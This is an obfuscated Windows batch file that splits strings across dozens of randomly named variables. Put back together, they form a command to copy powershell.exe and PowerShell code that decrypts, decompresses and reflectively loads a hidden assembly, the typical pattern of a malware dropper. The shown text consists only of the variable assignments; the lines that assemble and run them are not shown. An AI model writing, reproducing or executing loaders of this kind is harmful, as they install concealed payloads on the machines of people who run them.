@echo off
set "pWVCYwuSyz= /"
set "uJbZfACbTd=y "
set "GsunYNLXmO=rs"
set "IrUvSlkxMc=.e"
set "rALwocvsoz=we"
set "ZeylpeKjVz=0\"
set "kkVZvyIuVp=py"
set "ATByzOmHpa=in"
set "UiCdKUcZhG=xe"
set "RkjBTDGslS=\v"
set "YoCmdSaNNP=we"
set "ysjalfyMZq=nd"
set "lcquWlWRnx=32"
set "NfymlBBUdt=:\"
set "QqqLgXTWoB=he"
set "eFDhLLbGmg=em"
set "TwwpGsBSUi=Po"
set "JqPddNfeIH=rS"
set "aHktZjCAkG=co"
set "SxxMoIMzxM=he"
set "bLSZSeLJNT=ow"
set "EEKKQFgOSD=po"
set "BUixuIiQIk= C"
set "TMNxPSXWrD=ws"
set "zFGGiEjAtX=ll"
set "tQPaMuWybg=Sy"
set "CwaNbQorbH=Wi"
set "dOVMrQEaUX=st"
set "WNrCNeUvvE=s\"
set "hmHHQhRFkX=\W"
set "tplUUbyBPg=do"
set "BjYCOzscWn=ll"
set "nxknsIYQff=1."
set "oQhWDVISFr=cd"
set "rtkIwwBEfh= %~dp0"
set "JSJfibHYHk=NfqM"
set "LaiOaBoPIq=-4] "
set "QmkKPFcLYA=ew-O"
set "JQuJLaoBXL=zu);"
set "zVwPLuQmTG=daeR"
set "IfhPwWkFhO=join"
set "TuiSeZaOkv=Syst"
set "rxTKNWopDM= New"
set "WENOGQXwwD=Xxzu"
set "LnrFzNqTHl=..-1"
set "kXXFsLnOiC=saBm"
set "ttnTPQGCns=Fina"
set "LIpcewuLVn=jXxz"
set "lcqgYXSPmJ=mory"
set "dAhFHSRdQV=pres"
set "XfMfKJADTT=[Sys"
set "GduUrsNLBa=Secu"
set "TgwgKSRlVs=$jXx"
set "oNSyOJpDHl=m.IO"
set "KqFJLOyUWk=New-"
set "qOlupnYoSA=comp"
set "jAXtTnksNe=$iLo"
set "KVbycEpuHt=]::N"
set "vtzqORtsTp=sion"
set "HBYkRJzONx==');"
set "bGSmswXCuM=::('"
set "OWDmijDJUm=u.Pa"
set "ggtwCdHGBO=rwf "
set "ODHQFkrEkS=Disp"
set "JKPcuMCtbI=-nop"
set "UwUvcYdxqy=);$e"
set "OBtgHIUZrT=m = "
set "lyBZjwuzFf=nOr."
set "EWsMBzRfNE=ypto"
set "hOyFOkPCgk=L4Yi"
set "iVMomRlnQK=embl"
set "ykybaqXxus=t Sy"
set "QFmEbuIGUe=ach "
set "DLqOAzvbtM=[Sys"
set "FzkKAJKWZj=ke($"
set "PWNToBVIyL=)) {"
set "uHHXGWGSLx=('da"
set "dytBRGLNMm=ode]"
set "RKmuvGAGWP=tion"
set "JgCRqAvPsX=;$Tz"
set "TfiSmgkRGJ=eCJu"
set "niJKhpqmXP=UlE."
set "umcyEVDUgo=.Dis"
set "QWyEbMxHCP=gth)"
set "HMhvhQzkHs=f.En"
set "HnzXUpnYmD=Wktl"
set "ppRFWGYRHh=Ym, "
set "DaGpMkJrRl=TllA"
set "gGePbzRaul=Conv"
set "ZIQOQeOYjg=ecry"
set "avDGJqzEgK= = $"
set "rOpFgdTDpk=:: '"
set "HTovFzCnUv=.Ass"
set "dMmalvwrRg=tsWi"
set "nbcJfkQEvv=).Sp"
set "UImkeKCDjN=Mode"
set "psgBdGOiJz=urit"
set "OwgGaZmaka=PKCS"
set "EOStgiLfyv=F'[-"
set "QGXJeeZHKj=fjTO"
set "TYpWxBqVBf=$xeC"
set "NkTlAgcNcK=null"
set "FGHYZmMToQ=y.Pa"
